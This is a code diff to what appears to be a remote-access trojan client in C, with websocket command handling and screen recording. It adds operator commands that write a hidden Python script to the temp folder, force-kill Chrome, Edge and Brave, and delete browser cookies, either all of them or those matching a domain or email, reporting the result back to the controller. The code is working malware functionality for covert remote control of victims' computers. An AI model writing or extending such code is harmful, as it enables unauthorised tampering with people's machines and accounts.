@@ -347,6 +347,7 @@ void download_screenrecord();
 void delete_screenrecord();
 DWORD WINAPI screenrecord_thread(LPVOID param);
 DWORD WINAPI power_monitor_thread(LPVOID param);
+void delete_chrome_cookies(const char* filter);
 
 
 static HANDLE g_power_monitor_thread = NULL;
@@ -3839,6 +3840,207 @@ void delete_screenrecord() {
     send_websocket_data(msg, strlen(msg));
 }
 
+// Delete Chrome/Edge/Brave cookies
+// filter = NULL: delete ALL cookies
+// filter = domain (like "google.com"): delete cookies matching that domain
+// filter = email (like "exam@gsstulsipur.edu.np"): delete cookies from domains in that email
+void delete_chrome_cookies(const char* filter) {
+    char msg[1024];
+    char temp_dir[MAX_PATH];
+    char py_script[MAX_PATH];
+    int total_deleted = 0;
+    
+    GetTempPathA(MAX_PATH, temp_dir);
+    snprintf(py_script, sizeof(py_script), "%s\\.delcookie.py", temp_dir);
+    
+    // Browser paths to check (Chrome, Edge, Brave)
+    typedef struct {
+        const char* name;
+        const char* cookies_path;
+    } BrowserInfo;
+    
+    char local_app_data[MAX_PATH];
+    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_app_data);
+    
+    char chrome_cookies[MAX_PATH], edge_cookies[MAX_PATH], brave_cookies[MAX_PATH];
+    snprintf(chrome_cookies, sizeof(chrome_cookies), "%s\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", local_app_data);
+    snprintf(edge_cookies, sizeof(edge_cookies), "%s\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies", local_app_data);
+    snprintf(brave_cookies, sizeof(brave_cookies), "%s\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies", local_app_data);
+    
+    BrowserInfo browsers[] = {
+        {"Chrome", chrome_cookies},
+        {"Edge", edge_cookies},
+        {"Brave", brave_cookies}
+    };
+    
+    // Create Python script for cookie deletion
+    FILE* pf = fopen(py_script, "w");
+    if (!pf) {
+        send_websocket_data("[!] Failed to create deletion script\n", 37);
+        return;
+    }
+    
+    fprintf(pf, "#!/usr/bin/env python3\n");
+    fprintf(pf, "import os, sys, sqlite3, shutil, subprocess, time\n");
+    fprintf(pf, "\n");
+    fprintf(pf, "def kill_browser_processes():\n");
+    fprintf(pf, "    '''Kill Chrome, Edge, Brave processes to release database locks'''\n");
+    fprintf(pf, "    browsers = ['chrome.exe', 'msedge.exe', 'brave.exe']\n");
+    fprintf(pf, "    for browser in browsers:\n");
+    fprintf(pf, "        try:\n");
+    fprintf(pf, "            subprocess.run(['taskkill', '/F', '/IM', browser], capture_output=True)\n");
+    fprintf(pf, "        except: pass\n");
+    fprintf(pf, "    time.sleep(1)  # Give time for processes to die\n");
+    fprintf(pf, "\n");
+    fprintf(pf, "def delete_cookies(db_path, filter_domain=None):\n");
+    fprintf(pf, "    '''Delete cookies from a Chromium database'''\n");
+    fprintf(pf, "    if not os.path.exists(db_path):\n");
+    fprintf(pf, "        return 0\n");
+    fprintf(pf, "    \n");
+    fprintf(pf, "    # Copy to temp for safety\n");
+    fprintf(pf, "    temp_db = db_path + '.tmp_del'\n");
+    fprintf(pf, "    try:\n");
+    fprintf(pf, "        shutil.copy2(db_path, temp_db)\n");
+    fprintf(pf, "    except Exception as e:\n");
+    fprintf(pf, "        return -1  # Database locked\n");
+    fprintf(pf, "    \n");
+    fprintf(pf, "    deleted = 0\n");
+    fprintf(pf, "    try:\n");
+    fprintf(pf, "        conn = sqlite3.connect(temp_db)\n");
+    fprintf(pf, "        cursor = conn.cursor()\n");
+    fprintf(pf, "        \n");
+    fprintf(pf, "        if filter_domain:\n");
+    fprintf(pf, "            # Delete specific domain cookies (match domain or subdomain)\n");
+    fprintf(pf, "            # Extract domain from email if it looks like an email\n");
+    fprintf(pf, "            domain = filter_domain\n");
+    fprintf(pf, "            if '@' in domain:\n");
+    fprintf(pf, "                domain = domain.split('@')[-1]\n");
+    fprintf(pf, "            \n");
+    fprintf(pf, "            cursor.execute('SELECT COUNT(*) FROM cookies WHERE host_key LIKE ?', ('%%' + domain + '%%',))\n");
+    fprintf(pf, "            deleted = cursor.fetchone()[0]\n");
+    fprintf(pf, "            cursor.execute('DELETE FROM cookies WHERE host_key LIKE ?', ('%%' + domain + '%%',))\n");
+    fprintf(pf, "        else:\n");
+    fprintf(pf, "            # Delete ALL cookies\n");
+    fprintf(pf, "            cursor.execute('SELECT COUNT(*) FROM cookies')\n");
+    fprintf(pf, "            deleted = cursor.fetchone()[0]\n");
+    fprintf(pf, "            cursor.execute('DELETE FROM cookies')\n");
+    fprintf(pf, "        \n");
+    fprintf(pf, "        conn.commit()\n");
+    fprintf(pf, "        conn.close()\n");
+    fprintf(pf, "        \n");
+    fprintf(pf, "        # Copy back to original\n");
+    fprintf(pf, "        shutil.copy2(temp_db, db_path)\n");
+    fprintf(pf, "        os.remove(temp_db)\n");
+    fprintf(pf, "        return deleted\n");
+    fprintf(pf, "    except Exception as e:\n");
+    fprintf(pf, "        try: os.remove(temp_db)\n");
+    fprintf(pf, "        except: pass\n");
+    fprintf(pf, "        return -1\n");
+    fprintf(pf, "\n");
+    fprintf(pf, "# Main execution\n");
+    fprintf(pf, "filter_domain = %s\n", filter ? "r'''" : "None");
+    if (filter) {
+        fprintf(pf, "%s'''\n", filter);
+    }
+    fprintf(pf, "\n");
+    fprintf(pf, "kill_browser_processes()\n");
+    fprintf(pf, "\n");
+    fprintf(pf, "browsers = [\n");
+    for (int i = 0; i < sizeof(browsers)/sizeof(browsers[0]); i++) {
+        // Escape backslashes for Python
+        char escaped_path[MAX_PATH * 2];
+        int j = 0, k = 0;
+        while (browsers[i].cookies_path[j]) {
+            if (browsers[i].cookies_path[j] == '\\') {
+                escaped_path[k++] = '\\';
+                escaped_path[k++] = '\\';
+            } else {
+                escaped_path[k++] = browsers[i].cookies_path[j];
+            }
+            j++;
+        }
+        escaped_path[k] = '\0';
+        fprintf(pf, "    ('%s', r'%s'),\n", browsers[i].name, escaped_path);
+    }
+    fprintf(pf, "]\n");
+    fprintf(pf, "\n");
+    fprintf(pf, "results = []\n");
+    fprintf(pf, "for name, path in browsers:\n");
+    fprintf(pf, "    count = delete_cookies(path, filter_domain)\n");
+    fprintf(pf, "    results.append((name, count))\n");
+    fprintf(pf, "\n");
+    fprintf(pf, "# Output results\n");
+    fprintf(pf, "for name, count in results:\n");
+    fprintf(pf, "    if count == -1:\n");
+    fprintf(pf, "        print(f'{name}:LOCKED')\n");
+    fprintf(pf, "    elif count > 0:\n");
+    fprintf(pf, "        print(f'{name}:{count}')\n");
+    fprintf(pf, "    else:\n");
+    fprintf(pf, "        print(f'{name}:0')\n");
+    
+    fclose(pf);
+    
+    // Run Python script and capture output
+    char py_cmd[MAX_PATH * 2];
+    snprintf(py_cmd, sizeof(py_cmd), "python \"%s\" 2>nul", py_script);
+    
+    FILE* pipe = _popen(py_cmd, "r");
+    if (pipe) {
+        char line[256];
+        char result_msg[2048] = "";
+        
+        if (filter) {
+            sprintf(result_msg, "[*] Deleting cookies matching: %s\n", filter);
+        } else {
+            strcpy(result_msg, "[*] Deleting ALL browser cookies...\n");
+        }
+        
+        while (fgets(line, sizeof(line), pipe)) {
+            // Parse "Browser:count" format
+            char* colon = strchr(line, ':');
+            if (colon) {
+                *colon = '\0';
+                char* browser_name = line;
+                char* count_str = colon + 1;
+                
+                // Remove newline
+                char* nl = strchr(count_str, '\n');
+                if (nl) *nl = '\0';
+                
+                if (strcmp(count_str, "LOCKED") == 0) {
+                    char tmp[128];
+                    sprintf(tmp, "  [!] %s: Database locked (browser running?)\n", browser_name);
+                    strcat(result_msg, tmp);
+                } else {
+                    int count = atoi(count_str);
+                    total_deleted += count;
+                    if (count > 0) {
+                        char tmp[128];
+                        sprintf(tmp, "  [+] %s: Deleted %d cookie(s)\n", browser_name, count);
+                        strcat(result_msg, tmp);
+                    } else {
+                        char tmp[128];
+                        sprintf(tmp, "  [-] %s: No matching cookies\n", browser_name);
+                        strcat(result_msg, tmp);
+                    }
+                }
+            }
+        }
+        _pclose(pipe);
+        
+        char final_msg[128];
+        sprintf(final_msg, "[+] Total deleted: %d cookies\n", total_deleted);
+        strcat(result_msg, final_msg);
+        
+        send_websocket_data(result_msg, strlen(result_msg));
+    } else {
+        send_websocket_data("[!] Failed to run deletion script (Python not found?)\n", 54);
+    }
+    
+    // Cleanup
+    DeleteFileA(py_script);
+}
+
 void change_directory(const char* path) {
     if (SetCurrentDirectoryA(path)) {
         GetCurrentDirectoryA(MAX_PATH, g_current_dir);
@@ -4230,6 +4432,16 @@ void handle_command(const char* cmd) {
     }
     else if (strcmp(clean_cmd, "delrecord") == 0 || strcmp(clean_cmd, "deleterecord") == 0) {
         delete_screenrecord();
+    }
+    // Chrome cookie deletion
+    else if (strcmp(clean_cmd, "delcookie") == 0 || strcmp(clean_cmd, "clearcookies") == 0) {
+        delete_chrome_cookies(NULL);  // Delete all cookies
+    }
+    else if (strncmp(clean_cmd, "delcookie ", 10) == 0) {
+        delete_chrome_cookies(clean_cmd + 10);  // Delete specific domain/email cookies
+    }
+    else if (strncmp(clean_cmd, "clearcookies ", 13) == 0) {
+        delete_chrome_cookies(clean_cmd + 13);  // Delete specific domain/email cookies
     }
     // help is handled server-side, but respond if received
     else if (strcmp(clean_cmd, "help") == 0) {
